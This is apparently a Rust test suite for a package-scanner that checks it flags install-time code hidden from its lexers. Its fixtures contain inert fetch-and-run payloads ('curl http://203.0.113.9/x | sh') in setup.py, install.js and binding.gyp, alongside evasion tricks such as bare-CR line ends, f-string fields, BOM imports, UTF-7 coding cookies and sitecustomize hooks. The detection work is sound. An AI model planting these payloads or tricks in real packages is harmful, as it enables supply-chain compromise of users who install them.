//! Install-time code that the interpreter runs but the feature lexers do not see. The
//! scanner reports it in `hidden_code` (or `unread_code` when it cannot tell what runs),
//! while the model inputs (`features`, `tokens`) stay exactly as the feature lexers read them.
//! The payloads are inert strings: they are only ever lexed.

mod common;

use common::*;
use customs_scan::{scan_archive, Ecosystem, ScanOptions, ScanReport};

fn scan(bytes: &[u8], name: &str) -> ScanReport {
    let opts = ScanOptions {
        tokens: true,
        ..Default::default()
    };
    scan_archive(bytes, name, None, &opts).unwrap()
}

fn sdist(files: &[(&str, &str)]) -> ScanReport {
    let mut all = vec![("demo-1.0.0/PKG-INFO", BENIGN_PKG_INFO)];
    all.extend_from_slice(files);
    scan(&tar_gz_files(&all), "demo-1.0.0.tar.gz")
}

fn sdist_setup(setup: &str) -> ScanReport {
    sdist(&[("demo-1.0.0/setup.py", setup)])
}

fn npm(files: &[(&str, &str)]) -> ScanReport {
    let bytes = tar_gz_files(files);
    scan_archive(
        &bytes,
        "demo-1.0.0.tgz",
        Some(Ecosystem::Npm),
        &ScanOptions {
            tokens: true,
            ..Default::default()
        },
    )
    .unwrap()
}

const NPM_POSTINSTALL: &str =
    r#"{"name": "demo", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}"#;

fn npm_install_js(install_js: &str) -> ScanReport {
    npm(&[
        ("package/package.json", NPM_POSTINSTALL),
        ("package/install.js", install_js),
    ])
}

fn tokens(r: &ScanReport) -> Vec<&str> {
    r.tokens
        .as_deref()
        .unwrap_or_default()
        .iter()
        .map(String::as_str)
        .collect()
}

// ---- Line ends the feature lexers do not honor ----

#[test]
fn lone_cr_hides_nothing_from_hidden_code() {
    // CPython reads a bare CR as a line end, so this is `import os` and `os.system(...)`.
    let r = sdist_setup("# setup\rimport os\ros.system('curl http://203.0.113.9/x | sh')\r");
    assert_eq!(r.features["inst_proc_exec"], 0.0, "model inputs unchanged");
    assert_eq!(r.hidden_code.len(), 1, "{:?}", r.hidden_code);
    let h = &r.hidden_code[0];
    assert!(h.starts_with("setup.py:3: proc_exec"), "{h}");
    assert!(h.contains("ip_url"), "{h}");
    assert!(h.ends_with("(code after a bare carriage return)"), "{h}");
}

#[test]
fn js_lone_cr_and_u2028_comment_ends_are_seen() {
    for sep in ["\r", "\u{2028}", "\u{2029}"] {
        let r = npm_install_js(&format!(
            "// setup{sep}require('child_process').execSync('curl http://203.0.113.9/x | sh')\n"
        ));
        assert_eq!(r.features["inst_proc_exec"], 0.0, "{sep:?}");
        assert_eq!(r.hidden_code.len(), 1, "{sep:?} {:?}", r.hidden_code);
        assert!(
            r.hidden_code[0].starts_with("install.js:2: proc_exec"),
            "{:?}",
            r.hidden_code
        );
    }
}

#[test]
fn js_u2028_inside_a_string_does_not_end_it() {
    // A raw U+2028 is legal inside a JavaScript string literal and ends nothing.
    let r = npm_install_js(
        "const msg = 'a\u{2028}require(\"child_process\").execSync(\"id\")';\nconsole.log(msg);\n",
    );
    assert!(r.hidden_code.is_empty(), "{:?}", r.hidden_code);
}

#[test]
fn js_backslash_crlf_string_continuation_is_seen() {
    let r = npm_install_js("var a = 'x\\\r\n'; require('https').get('http://203.0.113.9/p')\r\n");
    assert_eq!(r.features["inst_network"], 0.0, "model inputs unchanged");
    assert_eq!(r.hidden_code.len(), 1, "{:?}", r.hidden_code);
    let h = &r.hidden_code[0];
    assert!(h.starts_with("install.js:2: network"), "{h}");
    assert!(h.contains("backslash-CRLF"), "{h}");
}

#[test]
fn crlf_file_without_tricks_has_no_hidden_code() {
    let r = sdist_setup(&MALICIOUS_SETUP_PY.replace('\n', "\r\n"));
    assert!(r.features["inst_proc_exec"] >= 1.0);
    assert!(r.hidden_code.is_empty(), "{:?}", r.hidden_code);
    let r = npm_install_js("require('https').get('http://203.0.113.9/p');\r\nvar a = 1;\r\n");
    assert!(r.hidden_code.is_empty(), "{:?}", r.hidden_code);
}

#[test]
fn default_lex_tokens_unchanged_for_cr_files() {
    let r = sdist_setup("# setup\rimport os\ros.system('id')\r");
    assert_eq!(tokens(&r), PINNED_CR_TOKENS);
}

// ---- Python f-string replacement fields ----

#[test]
fn fstring_field_payload_is_hidden_code() {
    let r = sdist_setup(
        "from setuptools import setup\nv = f\"{__import__('subprocess').getoutput('id')}\"\nsetup(name='demo', version=v)\n",
    );
    assert_eq!(r.features["inst_proc_exec"], 0.0, "model inputs unchanged");
    assert_eq!(r.hidden_code.len(), 1, "{:?}", r.hidden_code);
    let h = &r.hidden_code[0];
    assert!(h.starts_with("setup.py:2: "), "{h}");
    assert!(h.contains("proc_exec"), "{h}");
    assert!(h.ends_with("(code inside an f-string field)"), "{h}");
}

#[test]
fn pep701_nested_quotes_payload_is_hidden_code() {
    // Python 3.12+ lets a field reuse the enclosing quote character.
    for setup in [
        "x = f\"{__import__(\"os\").system(\"curl http://203.0.113.9/x | sh\")}\"\n",
        "x = f'''{\n  __import__('os').system('id')\n}'''\n",
        "x = rf\"{f'{__import__(\"os\").popen(\"id\")}'}\"\n",
        "x = t\"{__import__('os').system('id')}\"\n",
    ] {
        let r = sdist_setup(setup);
        assert_eq!(r.hidden_code.len(), 1, "{setup} {:?}", r.hidden_code);
        assert!(
            r.hidden_code[0].contains("proc_exec"),
            "{:?}",
            r.hidden_code
        );
    }
}

#[test]
fn plain_fstrings_produce_no_hidden_code() {
    let r = sdist_setup(concat!(
        "import os, platform, subprocess\n",
        "name, width, version = 'demo', 10, '1.0'\n",
        "a = f\"{name!r:>{width}}\"\n",
        "b = f\"{{literal}} {version}\"\n",
        "c = f'''{name}\n{version:%Y}'''\n",
        "d = rf\"\\d{width}\\N{name}\"\n",
        "e = f\"\\N{BULLET} {platform.system()} {os.environ.get('HOME')}\"\n",
        "f = f\"{ {'k': 1}['k'] } {(lambda x: x)(1)} {name=}\"\n",
        "subprocess.call(['git', 'describe'])\n",
    ));
    assert!(r.features["inst_proc_exec"] >= 1.0);
    assert!(r.hidden_code.is_empty(), "{:?}", r.hidden_code);
}

#[test]
fn fstring_field_naming_an_imported_module_is_not_hidden_code() {
    // requests 2.34.2's __init__ formats `{urllib3.__version__}` into a warning. The file
    // already uses the network module outside the field, so the field adds no new kind of
    // behavior.
    let r = sdist_setup(concat!(
        "import warnings\nimport urllib3\n",
        "warnings.warn(f\"urllib3 ({urllib3.__version__}) is not supported\")\n",
    ));
    assert!(r.features["inst_network"] >= 1.0);
    assert!(r.hidden_code.is_empty(), "{:?}", r.hidden_code);
}

#[test]
fn deeply_nested_fstrings_do_not_overflow() {
    let deep = format!("x = {}1{}\n", "f\"{".repeat(20_000), "}\"".repeat(20_000));
    let r = sdist_setup(&deep);
    assert!(r.hidden_code.is_empty());
}

#[test]
fn fstring_tokens_unchanged() {
    let r = sdist_setup("v = f\"{__import__('os').system('id')} {x!r:>{w}}\"\n");
    assert_eq!(tokens(&r), PINNED_FSTRING_TOKENS);
}

// ---- Byte-order marks ----

#[test]
fn bom_setup_py_hidden_helper_payload_is_hidden_code() {
    let r = sdist(&[
        (
            "demo-1.0.0/setup.py",
            "\u{feff}from helper import run\nfrom setuptools import setup\nrun()\nsetup(name='demo')\n",
        ),
        (
            "demo-1.0.0/helper.py",
            "import os\n\ndef run():\n    os.system('curl http://203.0.113.9/x | sh')\n",
        ),
    ]);
    assert!(!r.install_surface.contains(&"helper.py".to_string()));
    assert_eq!(r.features["inst_proc_exec"], 0.0, "model inputs unchanged");
    assert_eq!(r.hidden_code.len(), 1, "{:?}", r.hidden_code);
    let h = &r.hidden_code[0];
    assert!(h.starts_with("helper.py:4: proc_exec"), "{h}");
    assert!(
        h.ends_with("(imported by setup.py after a byte-order mark)"),
        "{h}"
    );
}

#[test]
fn bom_first_line_require_is_hidden_code() {
    let r = npm(&[
        ("package/package.json", NPM_POSTINSTALL),
        ("package/install.js", "\u{feff}require('./lib/run')\n"),
        (
            "package/lib/run.js",
            "const cp = require('child_process');\ncp.execSync('curl http://203.0.113.9/x | sh');\n",
        ),
    ]);
    assert!(!r.install_surface.contains(&"lib/run.js".to_string()));
    assert_eq!(r.hidden_code.len(), 1, "{:?}", r.hidden_code);
    let h = &r.hidden_code[0];
    assert!(h.starts_with("lib/run.js:"), "{h}");
    assert!(h.contains("proc_exec"), "{h}");
    assert!(
        h.ends_with("(imported by install.js after a byte-order mark)"),
        "{h}"
    );
}

#[test]
fn bom_file_without_hidden_imports_is_quiet() {
    let r = sdist(&[
        (
            "demo-1.0.0/setup.py",
            "\u{feff}import os\nfrom setuptools import setup\nos.system('echo hi')\nsetup(name='demo')\n",
        ),
        ("demo-1.0.0/demo/__init__.py", "\u{feff}from .core import add\n"),
        ("demo-1.0.0/demo/core.py", BENIGN_CORE),
    ]);
    assert!(r.hidden_code.is_empty(), "{:?}", r.hidden_code);
}

#[test]
fn bom_tokens_unchanged() {
    let r = sdist_setup("\u{feff}from helper import run\nrun()\n");
    assert_eq!(tokens(&r), PINNED_BOM_TOKENS);
}

// ---- PEP 263 coding cookies ----

fn unread_cookie(r: &ScanReport) -> Vec<&String> {
    r.unread_code
        .iter()
        .filter(|u| u.contains("declares coding"))
        .collect()
}

#[test]
fn utf7_cookie_setup_py_is_unread() {
    let r = sdist_setup("# -*- coding: utf-7 -*-\nimport os\n# +AAo-os.system('id')\n");
    assert_eq!(
        unread_cookie(&r),
        ["setup.py (declares coding utf-7; Python decodes it differently)"]
    );
    // An alias spelled another way is caught the same way.
    let r = sdist_setup("#!/usr/bin/env python\n# vim: set fileencoding=UTF_7 :\n");
    assert_eq!(unread_cookie(&r).len(), 1, "{:?}", r.unread_code);
}

#[test]
fn unicode_escape_cookie_is_unread() {
    for codec in [
        "unicode_escape",
        "raw-unicode-escape",
        "utf-16",
        "cp037",
        "hz",
    ] {
        let r = sdist(&[
            (
                "demo-1.0.0/setup.py",
                "from setuptools import setup\nsetup()\n",
            ),
            (
                "demo-1.0.0/demo/__init__.py",
                format!("# coding: {codec}\n# \\u000aimport os; os.system('id')\n").as_str(),
            ),
        ]);
        assert_eq!(unread_cookie(&r).len(), 1, "{codec} {:?}", r.unread_code);
        assert!(unread_cookie(&r)[0].starts_with("demo/__init__.py (declares coding"));
    }
}

#[test]
fn latin1_and_utf8_cookies_are_fine() {
    for cookie in [
        "# -*- coding: latin-1 -*-",
        "# coding=utf-8",
        "# vim: set fileencoding=utf8 :",
        "# -*- coding: UTF-8-sig -*-",
        "# coding: iso-8859-15",
        "# coding: cp1252",
        "# coding: euc-jp",
        "# coding: ascii",
        "# coding: shift_jis",
    ] {
        let r = sdist_setup(&format!(
            "{cookie}\nfrom setuptools import setup\nsetup()\n"
        ));
        assert!(unread_cookie(&r).is_empty(), "{cookie} {:?}", r.unread_code);
    }
}

#[test]
fn multibyte_codec_that_can_swallow_a_backslash_is_unread() {
    // In Shift JIS, 0x81 0x5C is one character, so the backslash no longer escapes the quote.
    let setup: &[u8] = b"# coding: shift_jis\nx = \"\x81\\\"; __import__('os').system('id') #\"\n";
    let bytes = tar_gz(&[
        TarItem::File("demo-1.0.0/PKG-INFO", BENIGN_PKG_INFO.as_bytes()),
        TarItem::File("demo-1.0.0/setup.py", setup),
    ]);
    let r = scan(&bytes, "demo-1.0.0.tar.gz");
    assert_eq!(unread_cookie(&r).len(), 1, "{:?}", r.unread_code);
}

#[test]
fn bad_cookie_off_the_install_surface_is_ignored() {
    // Linters ship files with odd cookies as test data.
    let r = sdist(&[
        (
            "demo-1.0.0/setup.py",
            "from setuptools import setup\nsetup()\n",
        ),
        ("demo-1.0.0/tests/data/utf7.py", "# coding: utf-7\nx = 1\n"),
    ]);
    assert!(unread_cookie(&r).is_empty(), "{:?}", r.unread_code);
}

// ---- npm runs node-gyp for an empty install script ----

#[test]
fn empty_install_script_still_runs_gyp() {
    let gyp =
        r#"{"targets": [{"target_name": "x", "sources": ["<!(curl http://203.0.113.9/x | sh)"]}]}"#;
    for scripts in [
        r#"{"install": ""}"#,
        r#"{"install": null}"#,
        r#"{"preinstall": "", "install": false}"#,
    ] {
        let pj = format!(r#"{{"name": "gy", "version": "1.0.0", "scripts": {scripts}}}"#);
        let r = npm(&[
            ("package/package.json", pj.as_str()),
            ("package/binding.gyp", gyp),
        ]);
        assert_eq!(
            r.features["n_npm_install_scripts"], 0.0,
            "model inputs unchanged"
        );
        assert_eq!(
            r.unread_code,
            ["binding.gyp (npm runs node-gyp rebuild: the install script is empty or not a string)"],
            "{scripts}"
        );
    }
    // A real install script, or none at all, reports no unread code.
    for scripts in [r#"{"install": "node-gyp rebuild"}"#, r#"{"test": "x"}"#] {
        let pj = format!(r#"{{"name": "gy", "version": "1.0.0", "scripts": {scripts}}}"#);
        let r = npm(&[
            ("package/package.json", pj.as_str()),
            ("package/binding.gyp", gyp),
        ]);
        assert!(r.unread_code.is_empty(), "{scripts} {:?}", r.unread_code);
    }
}

// ---- Wheel .data/purelib and .data/platlib ----

#[test]
fn data_purelib_sitecustomize_is_a_startup_hook() {
    let bytes = zip_files(&[
        ("demo/__init__.py", b""),
        (
            "demo-1.0.data/purelib/sitecustomize.py",
            b"import subprocess\nsubprocess.Popen(['sh', '-c', 'id'])\n",
        ),
        (
            "demo-1.0.data/platlib/usercustomize.py",
            b"import socket\nsocket.create_connection(('203.0.113.9', 80))\n",
        ),
        (
            "demo-1.0.dist-info/METADATA",
            b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n",
        ),
    ]);
    let r = scan(&bytes, "demo-1.0-py3-none-any.whl");
    assert_eq!(
        r.startup_hooks,
        [
            "demo-1.0.data/purelib/sitecustomize.py: proc_exec",
            "demo-1.0.data/platlib/usercustomize.py: network",
        ]
    );
}

#[test]
fn root_sitecustomize_is_a_startup_hook_too() {
    let bytes = zip_files(&[
        ("demo/__init__.py", b""),
        (
            "sitecustomize.py",
            b"import subprocess\nsubprocess.Popen(['sh', '-c', 'id'])\n",
        ),
        (
            "tests/sitecustomize.py",
            b"import socket\nsocket.socket()\n",
        ),
        (
            "demo-1.0.dist-info/METADATA",
            b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n",
        ),
    ]);
    let r = scan(&bytes, "demo-1.0-py3-none-any.whl");
    assert_eq!(r.startup_hooks, ["sitecustomize.py: proc_exec"]);
}

#[test]
fn data_purelib_init_payload_is_hidden_code() {
    let bytes = zip_files(&[
        ("demo/__init__.py", b""),
        (
            "demo-1.0.data/purelib/evil/__init__.py",
            b"import os\nos.system('curl http://203.0.113.9/x | sh')\n",
        ),
        (
            "demo-1.0.data/purelib/evil/util.py",
            b"import os\nos.system('id')\n",
        ),
        (
            "demo-1.0.dist-info/METADATA",
            b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n",
        ),
    ]);
    let r = scan(&bytes, "demo-1.0-py3-none-any.whl");
    assert_eq!(
        r.hidden_code,
        ["demo-1.0.data/purelib/evil/__init__.py:2: proc_exec, network, download_exec, ip_url (installs as evil/__init__.py, which runs on import)"]
    );
}

// Token streams of the files above, pinned so the hidden-code pass cannot change model inputs.
const PINNED_CR_TOKENS: &[&str] = &["<file>"];
const PINNED_FSTRING_TOKENS: &[&str] = &["<file>", "v", "=", "<str>"];
const PINNED_BOM_TOKENS: &[&str] = &[
    "<file>",
    "\u{feff}from",
    "helper",
    "import",
    "run",
    "run",
    "(",
    ")",
];

/// Hidden imports are followed up to a cap; past it, the scanner says so instead of going
/// quiet, so padding a file with harmless hidden imports cannot push a payload out of reach.
#[test]
fn hidden_imports_past_the_follow_cap_are_reported() {
    let names: Vec<String> = (0..20).map(|i| format!("h{i:02}")).collect();
    let setup = format!(
        "\u{feff}import {}\nfrom setuptools import setup\nsetup(name='demo')\n",
        names.join(", ")
    );
    let paths: Vec<String> = names.iter().map(|n| format!("demo-1.0.0/{n}.py")).collect();
    let payload = "import os\nos.system('curl http://203.0.113.9/x | sh')\n";
    let mut files: Vec<(&str, &str)> = vec![("demo-1.0.0/setup.py", setup.as_str())];
    for (i, p) in paths.iter().enumerate() {
        files.push((p.as_str(), if i == 19 { payload } else { "X = 1\n" }));
    }
    let r = sdist(&files);
    assert!(
        r.hidden_code
            .iter()
            .any(|h| h.starts_with("setup.py:") && h.contains("not read")),
        "{:?}",
        r.hidden_code
    );
    // Under the cap the payload itself is found.
    let r = sdist(&[
        (
            "demo-1.0.0/setup.py",
            "\u{feff}import h00, h01\nfrom setuptools import setup\n",
        ),
        ("demo-1.0.0/h00.py", "X = 1\n"),
        ("demo-1.0.0/h01.py", payload),
    ]);
    assert!(
        r.hidden_code
            .iter()
            .any(|h| h.starts_with("h01.py:2: proc_exec")),
        "{:?}",
        r.hidden_code
    );
}
